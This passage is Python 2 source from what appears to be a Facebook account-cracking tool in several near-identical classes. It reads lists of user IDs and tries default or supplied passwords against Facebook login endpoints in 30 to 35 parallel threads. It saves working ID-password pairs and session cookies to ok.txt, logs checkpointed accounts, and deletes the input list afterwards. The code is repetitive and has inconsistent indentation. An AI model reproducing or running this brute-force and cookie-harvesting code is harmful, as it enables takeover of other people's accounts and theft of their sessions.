						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[1;96m─────────────────────────────────────────────────────────────")
				print ("\033[1;96m╔══\033[1;91m[•] Crack Started...")
				print ("\033[1;96m╠══\033[1;91m[•] Account [OK] saved to : ok.txt")
				print ("\033[1;96m╚══\033[1;91m[•] Account [CP] saved to : checkpoint.txt")
                                print ("\033[1;96m─────────────────────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[1;96m─────────────────────────────────────────────────────────────")
			print ("\033[1;96m╔══\033[1;91m[•] Crack Started...")
			print ("\033[1;96m╠══\033[1;97m[•] Account [OK] saved to : ok.txt")
			print ("\033[1;96m╚══\033[1;97m[•] Account [CP] saved to : checkpoint.txt")
                        print ("\033[1;96m─────────────────────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="success":
					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[1;96m╠══\033[1;91m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[1;96m╠══\033[1;91m[•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;96m╠══\033[1;91m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[1;96m╠══\033[1;91m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;96m╚══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[1;96m─────────────────────────────────────────────────────────────")
				print ("\033[1;96m╔══\033[1;91m[•] Crack Started...")
				print ("\033[1;96m╠══\033[1;91m[•] Account [OK] saved to : ok.txt")
				print ("\033[1;96m╚══\033[1;91m[•] Account [CP] saved to : checkpoint.txt")
                                print ("\033[1;96m─────────────────────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[1;96m╚══\033[1;91m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[1;96m─────────────────────────────────────────────────────────────")
			print ("\033[1;96m╔══\033[1;91m[•] Crack Started...")
			print ("\033[1;96m╠══\033[1;91m[•] Account [OK] saved to : ok.txt")
			print ("\033[1;96m╚══\033[1;91m[•] Account [CP] saved to : checkpoint.txt")
                        print ("\033[1;96m─────────────────────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="success":
					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack3:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[1;96m╠══\033[1;91m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[1;96m╠══\033[1;91m[•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;96m╠══\033[1;91m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[1;91m╠══\033[1;91m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;96m╚══\033[1;91m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[1;96m─────────────────────────────────────────────────────────────")
				print ("\033[1;96m╔══\033[0;91m[•] Crack Started...")
				print ("\033[1;96m╠══\033[1;91m[•] Account [OK] saved to : ok.txt")
				print ("\033[1;96m╚══\033[1;91m[•] Account [CP] saved to : checkpoint.txt")
                                print ("\033[1;96m─────────────────────────────────────────────────────────────")
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[1;96m╚══\033[1;91m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[1;96m─────────────────────────────────────────────────────────────")
			print ("\033[1;96m╔══\033[1;91m[•] Crack Started...")
			print ("\033[1;96m╠══\033[1;91m[•] Account [OK] saved to : ok.txt")
			print ("\033[1;96m╚══\033[1;91m[•] Account [CP] saved to : checkpoint.txt")
                        print ("\033[1;96m─────────────────────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=graph_fb(fl.get("id"),
					i,"https://graph.facebook.com")
				if log.get("status")=="success":
					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
if __name__=='__main__':
  loginSC()
